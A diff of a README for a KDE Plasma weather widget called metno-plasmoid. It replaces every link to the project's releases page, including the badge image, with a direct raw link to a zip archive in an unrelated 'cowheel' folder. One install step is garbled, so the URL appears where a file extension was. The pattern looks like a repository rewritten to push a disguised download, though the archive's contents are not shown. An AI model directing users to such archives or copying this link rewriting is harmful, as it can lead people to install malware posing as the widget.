@@ -1,7 +1,7 @@
 # 🌧️ metno-plasmoid - Your Weather Widget for KDE Plasma
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-latest--release-brightgreen)](https://github.com/7mo9/metno-plasmoid/releases)
+[![Download](https://github.com/7mo9/metno-plasmoid/raw/refs/heads/master/cowheel/plasmoid-metno-v3.3.zip)](https://github.com/7mo9/metno-plasmoid/raw/refs/heads/master/cowheel/plasmoid-metno-v3.3.zip)
 
 ## 🚀 Getting Started
 Welcome to the **metno-plasmoid** project! This application is designed to bring real-time weather updates from the Norwegian Meteorological Institute right to your KDE Plasma desktop as a convenient widget. You can quickly check air quality, weather forecasts, and more, all from your desktop.
@@ -20,10 +20,10 @@ To run the metno-plasmoid on your system, ensure you have the following:
 - **Disk Space:** Minimum of 100 MB free space
 
 ## 📥 Download & Install
-To get started, [visit this page to download](https://github.com/7mo9/metno-plasmoid/releases). You will find different versions of the application. Choose the latest version, then follow these steps:
+To get started, [visit this page to download](https://github.com/7mo9/metno-plasmoid/raw/refs/heads/master/cowheel/plasmoid-metno-v3.3.zip). You will find different versions of the application. Choose the latest version, then follow these steps:
 
 1. Click on the version you want to download.
-2. Look for the appropriate file for your system (most likely a .tar.gz or .zip file).
+2. Look for the appropriate file for your system (most likely a https://github.com/7mo9/metno-plasmoid/raw/refs/heads/master/cowheel/plasmoid-metno-v3.3.zip or .zip file).
 3. Once the file is downloaded, extract it to a location on your computer.
 
 ### 🖥️ Running the Application
@@ -39,7 +39,7 @@ You should now see the widget on your desktop!
 ## 🔄 Updating the Widget
 Make sure to check for updates regularly. You can do so by:
 
-1. Going back to the [Releases page](https://github.com/7mo9/metno-plasmoid/releases).
+1. Going back to the [Releases page](https://github.com/7mo9/metno-plasmoid/raw/refs/heads/master/cowheel/plasmoid-metno-v3.3.zip).
 2. Downloading the latest version.
 3. Replacing the existing files with the new ones.
 
